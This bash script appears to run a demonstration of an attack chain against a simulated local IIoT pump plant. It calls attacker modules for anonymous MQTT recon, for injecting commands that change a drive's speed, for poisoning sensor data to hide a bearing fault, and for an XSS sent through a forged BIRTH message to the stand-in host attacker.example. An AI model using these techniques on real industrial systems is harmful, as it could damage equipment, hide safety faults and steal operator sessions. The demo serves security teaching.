#!/usr/bin/env bash
#
# Attack chain walkthrough — run alongside the dashboard at http://localhost:8000.
# docker compose up -d first, then ./demo.sh
#
# Against a local stack instead of Docker:
#   PLANT_PY="env MQTT_HOST=127.0.0.1 .venv/bin/python" \
#   RESET_STACK="your-reset-command" ./demo.sh
#
set -uo pipefail

API=${API:-http://localhost:8000}
PLANT_PY=${PLANT_PY:-docker compose exec -T attacker python}
RESET_STACK=${RESET_STACK:-docker compose up -d --force-recreate plc-sim edge-node platform}
GROUND_TRUTH=${GROUND_TRUTH:-docker compose logs --tail=12 edge-node}
# Demo-friendly fault timing (exported so docker compose picks them up on reset)
export FAULT_DELAY=${FAULT_DELAY:-12}
export FAULT_RAMP=${FAULT_RAMP:-40}
export SAMPLE_INTERVAL=${SAMPLE_INTERVAL:-2}
export ALARM_SUSTAIN=${ALARM_SUSTAIN:-6}

C_HEAD='\033[1;36m'; C_SAY='\033[0;37m'; C_ATT='\033[1;31m'; C_OK='\033[0;32m'; C_N='\033[0m'
banner(){ printf "\n${C_HEAD}════════════════════════════════════════════════════════════════${C_N}\n"; \
          printf   "${C_HEAD} %s${C_N}\n" "$1"; \
          printf   "${C_HEAD}════════════════════════════════════════════════════════════════${C_N}\n"; }
say(){ printf "${C_SAY}%s${C_N}\n" "$1"; }
att(){ printf "${C_ATT}\$ %s${C_N}\n" "$1"; }
pause(){ sleep "${1:-2}"; }

api_pump(){  # api_pump <PumpName>
  python3 - "$API" "$1" <<'PY'
import json,sys,urllib.request
api,pump=sys.argv[1],sys.argv[2]
try:
    s=json.load(urllib.request.urlopen(api+"/api/state",timeout=3))
except Exception as e:
    print("  (dashboard not reachable:",e,")"); sys.exit(0)
m=[x for x in s["pumps"] if x["name"]==pump]
if not m: print(f"  {pump}: (no data yet)"); sys.exit(0)
p=m[0]; d=p["metrics"]
print(f"  {pump}: health={p['health']:<8} DE={d.get('Bearing/DE Vibration')} mm/s  "
      f"speed={d.get('Process/Speed')}%   [open work orders: {len(s['work_orders'])}]")
PY
}

wait_api(){ for _ in $(seq 1 30); do
  python3 -c "import urllib.request;urllib.request.urlopen('$API/api/state',timeout=2)" 2>/dev/null && return 0
  sleep 1; done; }

clear
banner "IIoT CONDITION MONITORING — ATTACK WALKTHROUGH"
say "Target: North Plant pump house. MQTT + Sparkplug B backbone."
say "Dashboard: $API   (open it next to this terminal)"
say "Resetting the plant to a clean baseline..."
eval "$RESET_STACK" >/dev/null 2>&1
wait_api
pause 3

# ── ACT 1 ────────────────────────────────────────────────────────────────
banner "ACT 1 — Anonymous recon (the plant describes itself)"
say "No credentials. We connect, force a rebirth, and read the BIRTH certificates."
att "python -m attacker.recon"
$PLANT_PY -m attacker.recon --seconds 6
pause 4

# ── ACT 2 ────────────────────────────────────────────────────────────────
banner "ACT 2 — Command injection into a real drive"
say "Pump-102 right now:"
api_pump Pump-102
pause 2
say "One MQTT message writes the VFD speed setpoint. The edge node bridges it to Modbus."
att "python -m attacker.command --pump 102 --speed 20"
$PLANT_PY -m attacker.command --pump 102 --speed 20
say "Waiting for the drive to spin down..."
pause 8
say "Pump-102 after (speed read back through the platform):"
api_pump Pump-102
printf "${C_OK}  -> we moved a physical drive with an anonymous publish.${C_N}\n"
pause 4

# ── ACT 3a ───────────────────────────────────────────────────────────────
banner "ACT 3a — Baseline: the system does its job"
say "Resetting the Pump-101 bearing-fault clock (and clearing state)..."
eval "$RESET_STACK" >/dev/null 2>&1
wait_api
say "No attack. Watch a real bearing fault develop and get caught:"
for _ in 1 2 3 4 5 6; do pause 8; api_pump Pump-101; done
printf "${C_OK}  -> ALARM latched, a maintenance work order was opened automatically.${C_N}\n"
pause 4

# ── ACT 3b ───────────────────────────────────────────────────────────────
banner "ACT 3b — Same fault, now masked"
say "Reset again, but this time the attacker poisons Pump-101 from t=0."
eval "$RESET_STACK" >/dev/null 2>&1
wait_api
att "python -m attacker.poison --pump 101 --de 2.1 --interval 0.3 --duration 60"
$PLANT_PY -m attacker.poison --pump 101 --de 2.1 --interval 0.3 --duration 60 >/dev/null 2>&1 &
POISON=$!
say "The dashboard's view of Pump-101 while the same fault develops underneath:"
for _ in 1 2 3 4 5 6; do pause 8; api_pump Pump-101; done
wait $POISON 2>/dev/null
printf "${C_ATT}  -> health never latched ALARM. No work order. The fault is invisible.${C_N}\n"
say "Meanwhile the edge node's own logs show the truth the platform never saw:"
eval "$GROUND_TRUTH" 2>/dev/null | grep 'GROUND TRUTH' | tail -3 | sed 's/^/   /'
pause 3

# ── ACT 4 ────────────────────────────────────────────────────────────────
banner "ACT 4 — Pivot to the operator (XSS via forged BIRTH)"
say "A metric name lives in the protobuf body, so it can carry markup."
att "python -m attacker.spoof_birth_xss --callback http://attacker.example/steal"
$PLANT_PY -m attacker.spoof_birth_xss --callback http://attacker.example/steal
say "Refresh the dashboard: the forged device's tag renders and the onerror fires."
pause 3

banner "END — no credentials, no memory bugs. Just the protocol, wide open."
say "Write-up and fixes: BLOG"
